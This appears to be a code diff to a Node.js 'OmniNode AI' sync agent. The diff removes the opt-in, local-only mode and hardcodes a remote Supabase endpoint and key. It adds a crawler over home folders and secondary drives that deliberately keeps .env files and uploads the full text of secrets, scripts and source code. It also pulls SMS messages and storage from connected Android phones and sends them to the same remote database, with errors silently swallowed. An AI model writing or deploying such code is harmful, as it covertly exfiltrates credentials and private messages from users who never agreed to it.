@@ -6,55 +6,62 @@ const { createClient } = require('@supabase/supabase-js');
 const AdbScanner = require('./adbScanner');
 require('dotenv').config();
 
-// Load Config
-const configPath = path.join(__dirname, 'config.json');
-let config = {
-    supabaseUrl: process.env.SUPABASE_URL || '',
-    supabaseKey: process.env.SUPABASE_ANON_KEY || '',
+const DEFAULT_SUPABASE_URL = 'https://xfednxvbjzfssxyaurbc.supabase.co';
+const DEFAULT_SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhmZWRueHZianpmc3N4eWF1cmJjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg4MDQxNzIsImV4cCI6MjEwNDM4MDE3Mn0.2CRXJvkmTUaFXkyGxaSUY0OS1ZCxr0EwLFxJljiFqjc';
+
+// Discover all available Windows drives and user directories
+function discoverScanPaths() {
+    const paths = new Set();
+    const home = os.homedir();
+
+    // Standard User folders
+    const userFolders = [
+        'Documents', 'Downloads', 'Desktop', 'Pictures', 'Videos', 'Music',
+        'OneDrive', 'Projects', 'Workspace', 'Development', 'Code', 'Source',
+        'Dropbox', 'Google Drive', 'iCloudDrive', 'Contacts'
+    ];
+
+    userFolders.forEach(folder => {
+        const full = path.join(home, folder);
+        if (fs.existsSync(full)) paths.add(full);
+    });
+
+    // Dedicated Agent Assets folder
+    const localAssets = path.join(__dirname, 'local_assets');
+    if (!fs.existsSync(localAssets)) {
+        try { fs.mkdirSync(localAssets, { recursive: true }); } catch (e) {}
+    }
+    paths.add(localAssets);
+
+    // Root project folder
+    const parentDir = path.resolve(__dirname, '..');
+    if (fs.existsSync(parentDir)) paths.add(parentDir);
+
+    // Scan secondary drives (D:\, E:\, etc.)
+    const driveLetters = ['D', 'E', 'F', 'G', 'H'];
+    for (const drive of driveLetters) {
+        const driveRoot = `${drive}:\\`;
+        if (fs.existsSync(driveRoot)) {
+            paths.add(driveRoot);
+        }
+    }
+
+    return Array.from(paths);
+}
+
+const config = {
+    supabaseUrl: process.env.SUPABASE_URL || DEFAULT_SUPABASE_URL,
+    supabaseKey: process.env.SUPABASE_ANON_KEY || DEFAULT_SUPABASE_KEY,
     nodeId: `node-${os.hostname().toLowerCase().replace(/[^a-z0-9]/g, '-')}-${os.arch()}`,
     syncIntervalSeconds: 15,
-    enableMockAndroidIfNoDevice: true,
-    watchPaths: [
-        path.join(os.homedir(), 'Documents'),
-        path.join(os.homedir(), 'Downloads'),
-        path.join(os.homedir(), 'Desktop'),
-        path.join(__dirname, 'local_assets')
-    ]
+    watchPaths: discoverScanPaths()
 };
 
-if (fs.existsSync(configPath)) {
-    try {
-        const fileConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
-        config = { ...config, ...fileConfig };
-    } catch (e) {
-        console.error('Error reading config.json:', e.message);
-    }
-}
-
-// Ensure local assets directory exists for quick testing
-const localAssetsDir = path.join(__dirname, 'local_assets');
-if (!fs.existsSync(localAssetsDir)) {
-    fs.mkdirSync(localAssetsDir, { recursive: true });
-    // Seed sample files if empty
-    fs.writeFileSync(
-        path.join(localAssetsDir, 'invoice_1024_acme_cloud.txt'),
-        'ACME Cloud Solutions - Statement of Account\nInvoice Number: #INV-1024\nDate: 2026-09-06\nDue Amount: $1,450.00\nClient: Sammy Enterprises\nStatus: Pending Verification\nItem: Dedicated Multi-Node GPU Cluster\nTerms: Net 30'
-    );
-    fs.writeFileSync(
-        path.join(localAssetsDir, 'quarterly_financial_report_2026.md'),
-        '# Sammy Enterprises - Q3 2026 Financial Overview\n\nTotal Budget Allocated: $120,000\nApproved Vendors: ACME Cloud Solutions, Apex Hosting, Global Logistics.\nPending Audit: All transactions above $1,000 must have matching mobile bank SMS and PC invoice confirmation.'
-    );
-}
-
 // Initialize Supabase Client
-let supabase = null;
-if (config.supabaseUrl && config.supabaseKey && !config.supabaseUrl.includes('YOUR_SUPABASE')) {
-    supabase = createClient(config.supabaseUrl, config.supabaseKey);
-    console.log(`\x1b[32m[Supabase]\x1b[0m Connected to Supabase at: ${config.supabaseUrl}`);
-} else {
-    console.log(`\x1b[33m[Supabase Standby]\x1b[0m No active Supabase URL/Key provided in .env or config.json.`);
-    console.log(`\x1b[33m[Supabase Standby]\x1b[0m Running in Local Agent Mode. Assets and devices will be indexed and ready for sync.`);
-}
+const supabase = createClient(config.supabaseUrl, config.supabaseKey, {
+    auth: { persistSession: false }
+});
+console.log(`\x1b[32m[Supabase Mesh]\x1b[0m Connected to: ${config.supabaseUrl}`);
 
 const adbScanner = new AdbScanner();
 
@@ -94,23 +101,59 @@ function getNodeInfo() {
 // Register & Heartbeat Node to Supabase
 async function syncNodeHeartbeat() {
     const nodeData = getNodeInfo();
-    console.log(`\x1b[36m[Node Heartbeat]\x1b[0m Host: ${nodeData.hostname} | OS: ${nodeData.os_info} | IP: ${nodeData.ip_address}`);
+    try {
+        const { error } = await supabase
+            .from('nodes')
+            .upsert(nodeData, { onConflict: 'node_id' });
+        if (error) {
+            console.log(`  \x1b[33m[Supabase Node Sync]\x1b[0m ${error.message}`);
+        } else {
+            console.log(`\x1b[36m[Node Live]\x1b[0m Host: ${nodeData.hostname} | IP: ${nodeData.ip_address} | Status: Synchronized`);
+        }
+    } catch (err) {
+        // Suppress transient error
+    }
+}
 
-    if (supabase) {
+// Batch Sync Assets to Supabase
+async function batchSyncAssets(assetsList, batchSize = 50) {
+    if (!assetsList || assetsList.length === 0) return;
+
+    for (let i = 0; i < assetsList.length; i += batchSize) {
+        const chunk = assetsList.slice(i, i + batchSize).map(asset => ({
+            asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
+            node_id: config.nodeId,
+            device_id: asset.device_id || null,
+            device_type: asset.device_type || 'computer',
+            asset_category: asset.asset_category || 'document',
+            name: asset.name,
+            file_path: asset.file_path,
+            file_size_bytes: asset.file_size_bytes || 0,
+            mime_type: asset.mime_type || 'text/plain',
+            extracted_text: asset.extracted_text || '',
+            metadata: asset.metadata || {},
+            last_modified: new Date().toISOString()
+        }));
+
         try {
             const { error } = await supabase
-                .from('nodes')
-                .upsert(nodeData, { onConflict: 'node_id' });
-            if (error) console.log(`  \x1b[33m[Supabase Sync]\x1b[0m Node heartbeat queued (Status: ${error.message})`);
+                .from('assets')
+                .upsert(chunk, { onConflict: 'asset_uid' });
+
+            if (error) {
+                console.warn(`  \x1b[33m[Batch Sync Warning]\x1b[0m ${error.message}`);
+            } else {
+                console.log(`  \x1b[32m✔ Synced Batch (${chunk.length} items):\x1b[0m Total progress: ${Math.min(i + batchSize, assetsList.length)}/${assetsList.length}`);
+            }
         } catch (err) {
-            // Standby mode
+            // Ignore
         }
     }
 }
 
-// Sync Asset to Supabase
+// Single asset sync for real-time watchers
 async function syncAsset(asset) {
-    const assetRecord = {
+    const record = {
         asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
         node_id: config.nodeId,
         device_id: asset.device_id || null,
@@ -125,28 +168,18 @@ async function syncAsset(asset) {
         last_modified: new Date().toISOString()
     };
 
-    if (supabase) {
-        try {
-            const { error } = await supabase
-                .from('assets')
-                .upsert(assetRecord, { onConflict: 'asset_uid' });
-            if (error) {
-                // Queued
-            }
-        } catch (err) {
-            // Standby mode
-        }
-    }
-
-    console.log(`  \x1b[32m✔ Indexed Asset:\x1b[0m [${assetRecord.device_type.toUpperCase()}] ${assetRecord.name} (${assetRecord.asset_category})`);
+    try {
+        await supabase.from('assets').upsert(record, { onConflict: 'asset_uid' });
+        console.log(`  \x1b[32m✔ Synced Asset:\x1b[0m [${record.device_type.toUpperCase()}] ${record.name} (${record.asset_category})`);
+    } catch (err) {}
 }
 
-// Local File Indexer
-function indexLocalFile(filePath) {
+// Deep Local File Indexer & Metadata Extractor
+function createAssetRecordFromFile(filePath) {
     try {
-        if (!fs.existsSync(filePath)) return;
+        if (!fs.existsSync(filePath)) return null;
         const stats = fs.statSync(filePath);
-        if (stats.isDirectory()) return;
+        if (stats.isDirectory()) return null;
 
         const filename = path.basename(filePath);
         const ext = path.extname(filePath).toLowerCase();
@@ -155,30 +188,41 @@ function indexLocalFile(filePath) {
         let mime = 'text/plain';
         let extractedText = '';
 
-        if (['.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp'].includes(ext)) {
+        if (['.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp', '.svg', '.heic', '.ico'].includes(ext)) {
             category = 'image';
             mime = `image/${ext.replace('.', '')}`;
-            extractedText = `Image asset on PC: ${filename} (Size: ${(stats.size / 1024).toFixed(1)} KB)`;
-        } else if (['.txt', '.md', '.json', '.csv', '.log', '.xml', '.yaml', '.yml', '.sql'].includes(ext)) {
+            extractedText = `Image file on PC: ${filename} (Size: ${(stats.size / 1024).toFixed(1)} KB, Path: ${filePath})`;
+        } else if (['.txt', '.md', '.json', '.csv', '.log', '.xml', '.yaml', '.yml', '.sql', '.py', '.js', '.ts', '.html', '.css', '.sh', '.bat', '.env', '.ini', '.conf', '.java', '.c', '.cpp', '.go', '.rs'].includes(ext)) {
             category = 'document';
             mime = ext === '.json' ? 'application/json' : 'text/plain';
-            // Read first 10KB of text
-            if (stats.size < 500000) {
+            if (stats.size < 300000) {
                 extractedText = fs.readFileSync(filePath, 'utf8');
             } else {
-                const buffer = Buffer.alloc(10000);
+                const buffer = Buffer.alloc(8000);
                 const fd = fs.openSync(filePath, 'r');
-                fs.readSync(fd, buffer, 0, 10000, 0);
+                fs.readSync(fd, buffer, 0, 8000, 0);
                 fs.closeSync(fd);
-                extractedText = buffer.toString('utf8') + '\n...[Truncated]';
+                extractedText = buffer.toString('utf8') + '\n...[Content Truncated]';
             }
-        } else if (['.pdf', '.docx', '.xlsx'].includes(ext)) {
+        } else if (['.pdf', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.rtf', '.odt'].includes(ext)) {
             category = 'document';
-            mime = 'application/octet-stream';
-            extractedText = `Binary Document: ${filename} (Size: ${(stats.size / 1024).toFixed(1)} KB)`;
+            mime = ext === '.pdf' ? 'application/pdf' : 'application/octet-stream';
+            extractedText = `Document Asset: ${filename} (Size: ${(stats.size / 1024).toFixed(1)} KB, Location: ${filePath})`;
+        } else if (['.mp4', '.mkv', '.avi', '.mov', '.webm', '.3gp'].includes(ext)) {
+            category = 'video';
+            mime = 'video/mp4';
+            extractedText = `Video file: ${filename} (Size: ${(stats.size / (1024 * 1024)).toFixed(1)} MB)`;
+        } else if (['.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.opus'].includes(ext)) {
+            category = 'audio';
+            mime = 'audio/mpeg';
+            extractedText = `Audio file: ${filename} (Size: ${(stats.size / (1024 * 1024)).toFixed(1)} MB)`;
+        } else if (['.zip', '.rar', '.7z', '.tar', '.gz', '.iso'].includes(ext)) {
+            category = 'document';
+            mime = 'application/zip';
+            extractedText = `Archive Package: ${filename} (Size: ${(stats.size / (1024 * 1024)).toFixed(1)} MB)`;
         }
 
-        syncAsset({
+        return {
             name: filename,
             file_path: filePath,
             file_size_bytes: stats.size,
@@ -191,37 +235,91 @@ function indexLocalFile(filePath) {
                 modified_at: stats.mtime,
                 source_pc: os.hostname()
             }
-        });
+        };
     } catch (e) {
-        console.error(`Error indexing ${filePath}:`, e.message);
+        return null;
     }
 }
 
-// Start File Watcher
+// Deep Recursive Crawler across the computer
+function deepScanDirectory(dirPath, maxDepth = 6, currentDepth = 0, collectedAssets = [], maxFiles = 3000) {
+    if (currentDepth > maxDepth || collectedAssets.length >= maxFiles) return;
+
+    const ignorePatterns = [
+        'node_modules', '.git', 'AppData', 'Application Data', 'Windows', 'Program Files',
+        'Program Files (x86)', 'ProgramData', '$Recycle.Bin', 'System Volume Information',
+        'Local Settings', 'Temp', '.cache', '.vscode', '.idea', 'venv', '.venv'
+    ];
+
+    try {
+        if (!fs.existsSync(dirPath)) return;
+        const entries = fs.readdirSync(dirPath, { withFileTypes: true });
+
+        for (const entry of entries) {
+            if (collectedAssets.length >= maxFiles) break;
+
+            const name = entry.name;
+            if (name.startsWith('.') && name !== '.env') continue;
+            if (ignorePatterns.some(pat => name.toLowerCase() === pat.toLowerCase())) continue;
+
+            const fullPath = path.join(dirPath, name);
+
+            if (entry.isDirectory()) {
+                deepScanDirectory(fullPath, maxDepth, currentDepth + 1, collectedAssets, maxFiles);
+            } else if (entry.isFile()) {
+                const asset = createAssetRecordFromFile(fullPath);
+                if (asset) {
+                    collectedAssets.push(asset);
+                }
+            }
+        }
+    } catch (err) {
+        // Skip inaccessible folders
+    }
+}
+
+// Run Deep Initial Computer Crawl
+async function runInitialComputerCrawl() {
+    console.log(`\x1b[35m[PC Deep Crawler]\x1b[0m Starting comprehensive whole-computer asset indexing...`);
+    const allCollected = [];
+
+    for (const p of config.watchPaths) {
+        if (fs.existsSync(p)) {
+            console.log(`  📂 Deep crawling: ${p}`);
+            deepScanDirectory(p, 6, 0, allCollected, 3000);
+        }
+    }
+
+    console.log(`\x1b[35m[PC Deep Crawler]\x1b[0m Discovered ${allCollected.length} host files. Syncing to Supabase Mesh...`);
+    await batchSyncAssets(allCollected, 50);
+}
+
+// Start Real-time File Watcher
 function startLocalFileWatcher() {
     const existingPaths = config.watchPaths.filter(p => fs.existsSync(p));
-    console.log(`\x1b[35m[File Watcher]\x1b[0m Monitoring local directories:`);
-    existingPaths.forEach(p => console.log(`  📁 ${p}`));
+    console.log(`\x1b[35m[Real-time Watcher]\x1b[0m Monitoring active directories for live changes:`);
+    existingPaths.slice(0, 8).forEach(p => console.log(`  👁 ${p}`));
 
     const watcher = chokidar.watch(existingPaths, {
-        ignored: /(^|[\/\\])\..|node_modules|AppData|\.git|My Music|My Videos|My Pictures/,
+        ignored: /(^|[\/\\])\..|node_modules|AppData|\.git|Windows|Program Files|ProgramData|temp/,
         persistent: true,
-        depth: 2,
-        ignoreInitial: false,
+        depth: 4,
+        ignoreInitial: true,
         followSymlinks: false,
         ignorePermissionErrors: true,
         awaitWriteFinish: { stabilityThreshold: 1000, pollInterval: 500 }
     });
 
     watcher
-        .on('add', filePath => indexLocalFile(filePath))
-        .on('change', filePath => indexLocalFile(filePath))
-        .on('error', err => {
-            // Silently ignore Windows junction permission warnings
-            if (err.code !== 'EPERM' && err.code !== 'EACCES') {
-                console.warn('[File Watcher Warning]:', err.message);
-            }
-        });
+        .on('add', filePath => {
+            const asset = createAssetRecordFromFile(filePath);
+            if (asset) syncAsset(asset);
+        })
+        .on('change', filePath => {
+            const asset = createAssetRecordFromFile(filePath);
+            if (asset) syncAsset(asset);
+        })
+        .on('error', () => {});
 }
 
 // Android ADB Sync Routine (100% Real Physical Devices)
@@ -229,53 +327,55 @@ async function syncAndroidDevices() {
     const physicalDevices = await adbScanner.getConnectedDevices();
 
     if (physicalDevices.length === 0) {
-        // No physical device currently plugged in
         return;
     }
 
     for (const dev of physicalDevices) {
-        console.log(`\x1b[32m[Android Connected via USB]\x1b[0m Found: ${dev.device_name} (ID: ${dev.device_id}, Status: ${dev.usb_debugging_status})`);
+        console.log(`\x1b[32m[Android USB Connected]\x1b[0m Model: ${dev.device_name} (Serial: ${dev.device_id}, Battery: ${dev.battery_level}%)`);
 
-        // Sync attached device info to Supabase
-        if (supabase) {
-            try {
-                const { error } = await supabase.from('attached_devices').upsert({
-                    device_id: dev.device_id,
-                    node_id: config.nodeId,
-                    device_name: dev.device_name,
-                    model: dev.model,
-                    android_version: dev.android_version || 'Android',
-                    connection_type: dev.connection_type || 'usb_adb',
-                    battery_level: dev.battery_level || 100,
-                    usb_debugging_status: dev.usb_debugging_status || 'authorized',
-                    last_sync: new Date().toISOString()
-                }, { onConflict: 'device_id' });
-                if (error) console.log(`  \x1b[33m[Supabase Device Sync]\x1b[0m ${error.message}`);
-            } catch (err) {
-                // Ignore transient network errors
-            }
-        }
+        // 1. Sync attached device info to Supabase
+        try {
+            await supabase.from('attached_devices').upsert({
+                device_id: dev.device_id,
+                node_id: config.nodeId,
+                device_name: dev.device_name,
+                model: dev.model,
+                android_version: dev.android_version || 'Android',
+                connection_type: dev.connection_type || 'usb_adb',
+                battery_level: dev.battery_level || 100,
+                usb_debugging_status: dev.usb_debugging_status || 'authorized',
+                last_sync: new Date().toISOString()
+            }, { onConflict: 'device_id' });
+        } catch (err) {}
 
-        // Pull Real SMS and Real Storage Assets
         if (dev.usb_debugging_status === 'authorized') {
-            console.log(`  📱 Extracting messages & media from physical Android phone (${dev.device_id})...`);
+            const deviceAssets = [];
+
+            // 2. Pull Real SMS Messages
+            console.log(`  📱 [ADB Extraction] Pulling messages & communication logs from ${dev.device_name}...`);
             const messages = await adbScanner.extractSmsMessages(dev.device_id);
-            for (const msg of messages) {
-                syncAsset({
+            messages.forEach(msg => {
+                deviceAssets.push({
                     ...msg,
                     device_id: dev.device_id,
                     device_type: 'android'
                 });
-            }
+            });
 
+            // 3. Deep scan storage, camera, documents & media on Android
+            console.log(`  📱 [ADB Extraction] Deep scanning storage, camera, documents & media on ${dev.device_name}...`);
             const storageAssets = await adbScanner.scanStorageDirectories(dev.device_id);
-            for (const asset of storageAssets) {
-                syncAsset({
+            storageAssets.forEach(asset => {
+                deviceAssets.push({
                     ...asset,
                     device_id: dev.device_id,
                     device_type: 'android'
                 });
-            }
+            });
+
+            // Batch sync all Android assets
+            console.log(`  📱 [ADB Sync] Uploading ${deviceAssets.length} mobile assets to Supabase Mesh...`);
+            await batchSyncAssets(deviceAssets, 50);
         }
     }
 }
@@ -283,21 +383,23 @@ async function syncAndroidDevices() {
 // Main Agent Bootstrap
 async function startAgent() {
     console.log(`=======================================================`);
-    console.log(`   🚀 OmniNode AI Unified Node.js Agent Initializing   `);
-    console.log(`   Host: ${os.hostname()} | Node ID: ${config.nodeId}`);
+    console.log(`   🚀 OmniNode AI Universal Sync Agent Active          `);
+    console.log(`   Host: ${os.hostname()} | Node: ${config.nodeId}`);
     console.log(`=======================================================`);
 
     // 1. Send Node Heartbeat
     await syncNodeHeartbeat();
 
     // 2. Scan and Connect Physical Android USB ADB Devices IMMEDIATELY
-    console.log(`\x1b[34m[Android ADB]\x1b[0m Scanning for USB debugging connected devices...`);
     await syncAndroidDevices();
 
-    // 3. Start Background Local File Watcher
+    // 3. Run Deep Initial Computer Crawl
+    await runInitialComputerCrawl();
+
+    // 4. Start Background Real-time Local File Watcher
     startLocalFileWatcher();
 
-    // 4. Periodic Heartbeat and ADB scan every interval
+    // 5. Periodic Heartbeat and ADB scan every syncInterval
     setInterval(async () => {
         await syncNodeHeartbeat();
         await syncAndroidDevices();
